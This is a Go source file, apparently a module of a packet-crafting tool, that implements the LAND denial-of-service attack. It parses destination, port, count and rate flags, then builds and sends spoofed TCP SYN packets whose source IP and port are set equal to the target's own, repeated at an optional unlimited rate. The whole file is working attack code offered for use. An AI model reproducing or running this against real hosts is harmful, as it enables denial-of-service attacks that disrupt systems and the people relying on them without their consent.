package module

import (
	"os"
	"errors"
	"math/rand"

	"github.com/crazyboycjr/cyclone-jet-rocket/protocol"
	flags "github.com/jessevdk/go-flags"
)

type LandOpt struct {
	BaseOption
	DestFunc func(string) `short:"d" long:"destination" description:"destination address" value-name:"address"`
	PortFunc func(string) `short:"p" long:"dport" description:"destination port" value-name:"port"`
	port uint16
	CountFunc func(int) `short:"c" long:"count" description:"stop after sending count packets" value-name:"count" default:"0"`
	RateFunc func(string) `short:"r" long:"rate" description:"send packets as a specific rate, such as 100/ms, 2/s, 100/min, the default is \"nolimit\"" value-name:"<speed>" default:"nolimit"`
}

func (s LandOpt) IsBroadcast() bool {
	return false
}

func landEntry(stopChan chan int, remainFlags []string) error {
	var opts LandOpt

	var err2 error
	opts.PortFunc = func(portStr string) {
		var e error
		opts.port, e = parsePort(portStr)
		if e != nil { err2 = e }
	}

	opts.RateFunc = func(rate string) {
		e := commonRateFunc(&opts, rate)
		if e != nil { err2 = e }
	}
	opts.DestFunc = func(dest string) {
		e := commonDestFunc(&opts, dest)
		if e != nil { err2 = e }
	}
	opts.CountFunc = func(count int) {
		e := commonCountFunc(&opts, count)
		if e != nil { err2 = e }
	}

	//fmt.Println(remainFlags)
	cmd := flags.NewParser(&opts, flags.HelpFlag | flags.PrintErrors)

	_, err := cmd.ParseArgs(remainFlags)
	if err != nil {
		return err
	}

	if len(remainFlags) == 0 {
		cmd.WriteHelp(os.Stderr)
	}
	for _, flag := range remainFlags {
		if flag == "help" {
			cmd.WriteHelp(os.Stderr)
			return nil
		}
	}

	if err2 != nil { return err2 }

	if opts.dest == nil {
		return errors.New("no destination IP specified")
	}

	return packetSend(stopChan, landBuild, &opts)
}

func landBuild(opts_ CommonOption) []protocol.Layer {
	opts := opts_.(*LandOpt)

	pseudoHeader := make([]byte, 12, 12)
	copy(pseudoHeader[0:4], opts.dest.To4())
	copy(pseudoHeader[4:8], opts.dest.To4())
	tcp := &protocol.TCP {
		PseudoHeader: pseudoHeader,
		SrcPort: opts.port,
		DstPort: opts.port,
		Seq: uint32(rand.Intn(0x100000000)),
		Ack: 0,
		Flags: protocol.TCPFlags {
			SYN: true,
		},
		Rwnd: 20 * 1460,
		UrgPtr: 0,
	}

	ip4 := &protocol.IPv4Packet {
		Version: 4,
		IHL: 5,
		DSCP: 0,
		ECN: 0, // TODO just see what will happen
		ID: uint16(rand.Intn(0xffff)),
		DF: true,
		MF: false,
		FragmentOffset: 0,
		TTL: uint8(64),
		Protocol: protocol.IPP_TCP,
		SrcIP: opts.dest,
		DstIP: opts.dest,
	}
	return []protocol.Layer{ip4, tcp}
}

